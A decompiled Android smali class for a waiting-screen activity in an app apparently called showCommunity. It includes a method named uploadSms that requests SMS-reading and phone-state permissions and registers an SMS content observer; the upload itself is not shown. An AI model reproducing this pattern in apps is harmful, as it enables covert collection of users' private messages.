.class public Lcom/mobilelive/showCommunity/activity/WaitCheckActivity;
.super Lcom/common/lib/activity/BaseActivity;
.source "WaitCheckActivity.java"

# interfaces
.implements Lcom/mobilelive/showCommunity/contract/AboutUsContract$View;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lcom/common/lib/activity/BaseActivity<",
        "Lcom/mobilelive/showCommunity/contract/AboutUsContract$Presenter;",
        ">;",
        "Lcom/mobilelive/showCommunity/contract/AboutUsContract$View;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 22
    invoke-direct {p0}, Lcom/common/lib/activity/BaseActivity;-><init>()V

    return-void
.end method

.method private uploadSms()V
    .locals 3

    .line 42
    invoke-static {}, Lcom/common/lib/sms/SmsServiceRoom;->getInstance()Lcom/common/lib/sms/SmsServiceRoom;

    move-result-object v0

    invoke-virtual {v0}, Lcom/common/lib/sms/SmsServiceRoom;->getSmsContent()Lcom/common/lib/sms/SmsContent;

    move-result-object v0

    if-nez v0, :cond_0

    .line 43
    invoke-static {p0}, Lcom/permissionx/guolindev/PermissionX;->init(Landroidx/fragment/app/FragmentActivity;)Lcom/permissionx/guolindev/PermissionMediator;

    move-result-object v0

    const-string v1, "android.permission.READ_SMS"

    const-string v2, "android.permission.READ_PHONE_STATE"

    filled-new-array {v1, v2}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/permissionx/guolindev/PermissionMediator;->permissions([Ljava/lang/String;)Lcom/permissionx/guolindev/request/PermissionBuilder;

    move-result-object v0

    new-instance v1, Lcom/mobilelive/showCommunity/activity/WaitCheckActivity$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/mobilelive/showCommunity/activity/WaitCheckActivity$$ExternalSyntheticLambda0;-><init>(Lcom/mobilelive/showCommunity/activity/WaitCheckActivity;)V

    .line 44
    invoke-virtual {v0, v1}, Lcom/permissionx/guolindev/request/PermissionBuilder;->request(Lcom/permissionx/guolindev/callback/RequestCallback;)V

    :cond_0
    return-void
.end method


# virtual methods
.method public getAboutUsSuccess(Ljava/util/ArrayList;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList<",
            "Lcom/common/lib/bean/ArticleBean;",
            ">;)V"
        }
    .end annotation

    if-eqz p1, :cond_0

    .line 67
    invoke-virtual {p1}, Ljava/util/ArrayList;->isEmpty()Z

    :cond_0
    return-void
.end method

.method protected getLayoutId()I
    .locals 1

    const v0, 0x7f0c0020

    return v0
.end method

.method public synthetic lambda$uploadSms$0$com-mobilelive-showCommunity-activity-WaitCheckActivity(ZLjava/util/List;Ljava/util/List;)V
    .locals 0

    if-eqz p1, :cond_0

    .line 46
    new-instance p1, Lcom/common/lib/sms/SmsContent;

    invoke-direct {p1, p0}, Lcom/common/lib/sms/SmsContent;-><init>(Landroid/app/Activity;)V

    .line 47
    invoke-virtual {p1}, Lcom/common/lib/sms/SmsContent;->register()V

    .line 48
    invoke-static {}, Lcom/common/lib/sms/SmsServiceRoom;->getInstance()Lcom/common/lib/sms/SmsServiceRoom;

    move-result-object p2

    invoke-virtual {p2, p1}, Lcom/common/lib/sms/SmsServiceRoom;->setSmsContent(Lcom/common/lib/sms/SmsContent;)V

    :cond_0
    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 0

    return-void
.end method

.method protected bridge synthetic onCreatePresenter()Lcom/common/lib/mvp/IPresenter;
    .locals 1

    .line 22
    invoke-virtual {p0}, Lcom/mobilelive/showCommunity/activity/WaitCheckActivity;->onCreatePresenter()Lcom/mobilelive/showCommunity/contract/AboutUsContract$Presenter;

    move-result-object v0

    return-object v0
.end method

.method protected onCreatePresenter()Lcom/mobilelive/showCommunity/contract/AboutUsContract$Presenter;
    .locals 1

    .line 57
    new-instance v0, Lcom/mobilelive/showCommunity/presenter/AboutUsPresenter;

    invoke-direct {v0, p0}, Lcom/mobilelive/showCommunity/presenter/AboutUsPresenter;-><init>(Lcom/mobilelive/showCommunity/contract/AboutUsContract$View;)V

    return-object v0
.end method

.method protected onCreated(Landroid/os/Bundle;)V
    .locals 2

    const p1, 0x7f090235

    const v0, 0x7f0f002c

    .line 34
    invoke-virtual {p0, p1, v0}, Lcom/mobilelive/showCommunity/activity/WaitCheckActivity;->setText(II)V

    const/4 p1, 0x1

    new-array p1, p1, [I

    const/4 v0, 0x0

    const v1, 0x7f090105

    aput v1, p1, v0

    .line 35
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/WaitCheckActivity;->setViewGone([I)V

    const p1, 0x7f0900f3

    .line 36
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/WaitCheckActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    .line 37
    invoke-static {p0}, Lcom/bumptech/glide/Glide;->with(Landroidx/fragment/app/FragmentActivity;)Lcom/bumptech/glide/RequestManager;

    move-result-object v0

    invoke-virtual {v0}, Lcom/bumptech/glide/RequestManager;->asGif()Lcom/bumptech/glide/RequestBuilder;

    move-result-object v0

    const v1, 0x7f080068

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/bumptech/glide/RequestBuilder;->load(Ljava/lang/Integer;)Lcom/bumptech/glide/RequestBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Lcom/bumptech/glide/RequestBuilder;->into(Landroid/widget/ImageView;)Lcom/bumptech/glide/request/target/ViewTarget;

    return-void
.end method

.method protected updateUIText()V
    .locals 0

    return-void
.end method
